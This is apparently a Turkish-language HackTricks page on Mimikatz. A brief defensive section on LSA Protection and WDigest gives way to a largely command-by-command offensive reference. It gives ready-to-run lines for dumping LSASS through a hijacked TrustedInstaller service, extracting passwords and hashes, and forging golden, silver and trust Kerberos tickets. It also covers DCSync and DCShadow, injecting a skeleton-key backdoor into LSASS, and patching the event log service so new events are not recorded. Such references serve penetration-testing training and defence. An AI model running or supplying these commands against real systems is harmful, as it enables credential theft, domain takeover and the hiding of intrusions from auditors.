# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademisi ile derinleştirin. Kendi hızınızda ilerleyerek iOS ve Android güvenliğini öğrenin ve sertifika kazanın:

{% embed url="https://academy.8ksec.io/" %}

**Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) adresinden alınmıştır**. Daha fazla bilgi için orijinaline bakın!

## Bellekte LM ve Düz Metin

Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgisi hırsızlığına karşı önemli önlemler alınmıştır:

- **LM hash'leri ve düz metin şifreler** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmaması için _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarının `0` DWORD değeri ile yapılandırılması gerekmektedir.

- **LSA Koruması**, Yerel Güvenlik Otoritesi (LSA) sürecini yetkisiz bellek okuma ve kod enjeksiyonuna karşı korumak için tanıtılmıştır. Bu, LSASS'in korunan bir süreç olarak işaretlenmesiyle sağlanır. LSA Korumasının etkinleştirilmesi şunları içerir:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterini değiştirerek `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
2. Bu kayıt defteri değişikliğini yönetilen cihazlar arasında zorunlu kılan bir Grup Politika Nesnesi (GPO) uygulamak.

Bu korumalara rağmen, Mimikatz gibi araçlar belirli sürücüleri kullanarak LSA Korumasını aşabilir, ancak bu tür eylemlerin olay günlüklerinde kaydedilmesi muhtemeldir.

### SeDebugPrivilege Kaldırma ile Mücadele

Yönetici kullanıcılar genellikle programları hata ayıklama yeteneği veren SeDebugPrivilege'e sahiptir. Bu ayrıcalık, yetkisiz bellek dökümünü önlemek için kısıtlanabilir; bu, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Ancak, bu ayrıcalık kaldırıldığında bile, TrustedInstaller hesabı özelleştirilmiş bir hizmet yapılandırması kullanarak bellek dökümleri gerçekleştirebilir:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Bu, `lsass.exe` belleğinin bir dosyaya dökülmesini sağlar; bu dosya daha sonra başka bir sistemde analiz edilerek kimlik bilgileri çıkarılabilir:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Seçenekleri

Mimikatz'ta olay günlüğü manipülasyonu iki ana eylemi içerir: olay günlüklerini temizleme ve yeni olayların kaydedilmesini önlemek için Olay hizmetini yamanma. Aşağıda bu eylemleri gerçekleştirmek için komutlar bulunmaktadır:

#### Olay Günlüklerini Temizleme

- **Komut**: Bu eylem, olay günlüklerini silmeyi amaçlar, böylece kötü niyetli faaliyetleri takip etmeyi zorlaştırır.
- Mimikatz, standart belgelerinde olay günlüklerini doğrudan komut satırı aracılığıyla temizlemek için doğrudan bir komut sağlamaz. Ancak, olay günlüğü manipülasyonu genellikle belirli günlükleri temizlemek için Mimikatz dışında sistem araçları veya betikler kullanmayı içerir (örneğin, PowerShell veya Windows Olay Görüntüleyici kullanarak).

#### Deneysel Özellik: Olay Hizmetini Yamama

- **Komut**: `event::drop`
- Bu deneysel komut, Olay Günlüğü Hizmeti'nin davranışını değiştirmek için tasarlanmıştır ve etkili bir şekilde yeni olayların kaydedilmesini önler.
- Örnek: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` komutu, Mimikatz'ın sistem hizmetlerini değiştirmek için gerekli ayrıcalıklarla çalışmasını sağlar.
- `event::drop` komutu daha sonra Olay Günlüğü hizmetini yamalar.

### Kerberos Bilet Saldırıları

### Golden Ticket Oluşturma

Golden Ticket, alan genelinde erişim taklidi yapmayı sağlar. Ana komut ve parametreler:

- Komut: `kerberos::golden`
- Parametreler:
- `/domain`: Alan adı.
- `/sid`: Alanın Güvenlik Tanımlayıcısı (SID).
- `/user`: Taklit edilecek kullanıcı adı.
- `/krbtgt`: Alanın KDC hizmet hesabının NTLM hash'i.
- `/ptt`: Bileti doğrudan belleğe enjekte eder.
- `/ticket`: Bileti daha sonra kullanmak üzere kaydeder.

Örnek:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Oluşturma

Silver Ticket'lar belirli hizmetlere erişim sağlar. Ana komut ve parametreler:

- Komut: Golden Ticket'e benzer ancak belirli hizmetleri hedef alır.
- Parametreler:
- `/service`: Hedef alınacak hizmet (örneğin, cifs, http).
- Diğer parametreler Golden Ticket ile benzerdir.

Örnek:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Güven Bileti Oluşturma

Güven Biletleri, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:

- Komut: Golden Ticket'e benzer ancak güven ilişkileri için.
- Parametreler:
- `/target`: Hedef alanın FQDN'si.
- `/rc4`: Güven hesabı için NTLM hash'i.

Örnek:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Ek Kerberos Komutları

- **Biletleri Listeleme**:

- Komut: `kerberos::list`
- Mevcut kullanıcı oturumu için tüm Kerberos biletlerini listeler.

- **Önbelleği Geç**:

- Komut: `kerberos::ptc`
- Önbellek dosyalarından Kerberos biletlerini enjekte eder.
- Örnek: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Bileti Geç**:

- Komut: `kerberos::ptt`
- Başka bir oturumda Kerberos biletini kullanmaya olanak tanır.
- Örnek: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Biletleri Temizle**:
- Komut: `kerberos::purge`
- Oturumdan tüm Kerberos biletlerini temizler.
- Çatışmaları önlemek için bilet manipülasyon komutlarını kullanmadan önce faydalıdır.

### Active Directory Manipülasyonu

- **DCShadow**: Bir makineyi AD nesne manipülasyonu için geçici olarak DC olarak çalıştırır.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Şifre verilerini talep etmek için bir DC'yi taklit eder.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Kimlik Bilgilerine Erişim

- **LSADUMP::LSA**: LSA'dan kimlik bilgilerini çıkarır.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Bir bilgisayar hesabının şifre verilerini kullanarak bir DC'yi taklit eder.

- _Orijinal bağlamda NetSync için özel bir komut sağlanmamıştır._

- **LSADUMP::SAM**: Yerel SAM veritabanına erişim sağlar.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Kayıt defterinde saklanan sırları şifrelerini çözer.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Bir kullanıcı için yeni bir NTLM hash'i ayarlar.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Güven bilgilerini alır.
- `mimikatz "lsadump::trust" exit`

### Çeşitli

- **MISC::Skeleton**: LSASS'a bir arka kapı enjekte eder.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Yetki Yükseltme

- **PRIVILEGE::Backup**: Yedekleme haklarını edinir.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Hata ayıklama ayrıcalıklarını elde eder.
- `mimikatz "privilege::debug" exit`

### Kimlik Bilgisi Dökümü

- **SEKURLSA::LogonPasswords**: Giriş yapmış kullanıcılar için kimlik bilgilerini gösterir.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Bellekten Kerberos biletlerini çıkarır.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid ve Token Manipülasyonu

- **SID::add/modify**: SID ve SIDHistory'yi değiştirir.

- Ekle: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Değiştir: _Orijinal bağlamda değiştirme için özel bir komut yoktur._

- **TOKEN::Elevate**: Token'ları taklit eder.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Hizmetleri

- **TS::MultiRDP**: Birden fazla RDP oturumuna izin verir.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP oturumlarını listeler.
- _Orijinal bağlamda TS::Sessions için özel bir komut sağlanmamıştır._

### Vault

- Windows Vault'tan şifreleri çıkarır.
- `mimikatz "vault::cred /patch" exit`

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademi ile derinleştirin. Kendi hızınızda kurslar aracılığıyla iOS ve Android güvenliğini öğrenin ve sertifika kazanın:

{% embed url="https://academy.8ksec.io/" %}

{{#include ../../banners/hacktricks-training.md}}
